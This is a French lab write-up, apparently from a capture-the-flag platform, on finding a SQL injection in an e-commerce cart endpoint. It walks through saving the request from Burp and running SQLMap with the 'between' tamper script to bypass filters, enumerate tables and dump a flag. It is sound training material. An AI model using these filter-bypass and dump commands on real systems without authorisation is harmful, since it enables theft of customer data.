# Lab - Injection SQL sur application e-commerce

Ce lab met en situation une application web de type boutique en ligne, protégée par des mécanismes de filtrage basiques. L'objectif est d'identifier un point d'injection SQL, de l'exploiter avec SQLMap en contournant les protections, puis d'extraire les données sensibles de la base de production.

## Scénario

On dispose d'un accès à une application e-commerce fonctionnelle. Le site affiche des produits, permet de naviguer par catégorie et propose un bouton d'ajout au panier. Aucun formulaire de login ou de recherche n'est visible en surface.

L'application intègre des protections côté serveur qui bloquent certains payloads SQL classiques. Il faut donc trouver le bon point d'entrée et adapter la stratégie d'injection.

{% hint style="info" %}
Ce type de scénario est courant en pentest web : l'injection ne se trouve pas forcément dans un champ de recherche ou un formulaire de login. Les actions utilisateur comme l'ajout au panier, le tri de produits ou les filtres génèrent souvent des requêtes avec des paramètres injectables.
{% endhint %}

## Approche

### Identifier le point d'injection

La première étape consiste à intercepter le trafic HTTP avec Burp Suite pour observer les requêtes générées par chaque interaction utilisateur.

En cliquant sur le bouton d'ajout au panier, on repère une requête POST contenant un paramètre `id` (ou similaire) transmis au serveur. C'est notre candidat pour l'injection.

{% hint style="success" %}
Dans Burp, le raccourci "Copy to file" (clic droit sur la requête dans l'historique HTTP) permet de sauvegarder directement la requête brute dans un fichier exploitable par SQLMap avec l'option `-r`.
{% endhint %}

### Préparer la requête

On sauvegarde la requête interceptée dans un fichier (par exemple `req.txt`). Ce fichier contient l'intégralité de la requête HTTP telle que le navigateur l'a envoyée : en-têtes, cookies de session, corps POST.

```
POST /action.php HTTP/1.1
Host: <IP_CIBLE>:<PORT>
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123...

id=1
```

L'avantage de travailler avec un fichier de requête plutôt qu'une URL reconstruite manuellement : SQLMap reprend automatiquement tous les en-têtes, cookies et paramètres sans qu'on ait à les spécifier un par un.

## Commandes

### Reconnaissance initiale

On lance SQLMap avec le fichier de requête pour confirmer l'injection et identifier le contexte de la base de données. Le tamper script `between` est nécessaire pour contourner les filtres en place.

```bash
# - Depuis Exegol, on pointe SQLMap sur la requête sauvegardee
sqlmap -r req.txt --batch --tamper=between --current-user --current-db
```

SQLMap détecte l'injection, identifie le SGBD (MySQL dans ce cas) et retourne les informations de base :

```
current user: 'admin@localhost'
current database: 'production'
```

{% hint style="warning" %}
Sans le tamper script `between`, les payloads sont bloqués par les filtres de l'application. Si SQLMap ne trouve rien sur une cible qui devrait être vulnérable, tester différents tamper scripts est un réflexe essentiel.
{% endhint %}

### Enumération des tables

Maintenant qu'on connait la base `production`, on liste ses tables :

```bash
# - Lister les tables de la base production
sqlmap -r req.txt --batch --tamper=between -D production --tables
```

Résultat attendu :

```
Database: production
[5 tables]
+-------------+
| brands      |
| categories  |
| final_flag  |
| order_items |
| products    |
+-------------+
```

La table `final_flag` sort immédiatement du lot. Dans un contexte réel, on chercherait plutôt des tables contenant des identifiants, des mots de passe ou des données clients.

### Extraction des données

On cible directement la table identifiée pour en extraire le contenu :

```bash
# - Dump de la table cible dans la base production
sqlmap -r req.txt --batch --tamper=between -D production -T final_flag --dump
```

```
Database: production
Table: final_flag
[1 entry]
+----+-----------------------------+
| id | content                     |
+----+-----------------------------+
| 1  | HTB{...}                    |
+----+-----------------------------+
```

{% hint style="info" %}
SQLMap stocke automatiquement les résultats dans des fichiers CSV sous `~/.local/share/sqlmap/output/<cible>/`. Pratique pour retrouver les données extraites sans relancer le dump.
{% endhint %}

## Ce qu'on en retient

Ce lab illustre plusieurs points importants pour l'utilisation de SQLMap en conditions réelles :

**Le point d'injection n'est pas toujours évident.** Sans Burp pour intercepter les requêtes, le paramètre injectable dans l'action d'ajout au panier serait passé inaperçu. L'interception systématique du trafic est indispensable.

**L'option `-r` simplifie tout.** Plutôt que de reconstruire manuellement une commande avec `-u`, `--data`, `--cookie` et `-H`, sauvegarder la requête complète depuis Burp garantit que SQLMap travaille dans les mêmes conditions que le navigateur.

**Les tamper scripts débloquent les situations.** Face à des filtres applicatifs, le bon tamper script (ici `between`, qui remplace les opérateurs de comparaison par leur équivalent `BETWEEN`) fait la différence entre un scan qui échoue et une exploitation réussie.

**La méthodologie reste la même.** Quel que soit le niveau de protection, la démarche ne change pas : identifier le point d'injection, confirmer la vulnérabilité, énumérer progressivement (base, tables, colonnes), puis extraire les données ciblées.

{% hint style="success" %}
En pentest, documenter chaque étape (requête interceptée, commandes SQLMap, résultats obtenus) est aussi important que l'exploitation elle-même. Le rapport final doit permettre au client de reproduire et comprendre la vulnérabilité.
{% endhint %}

***
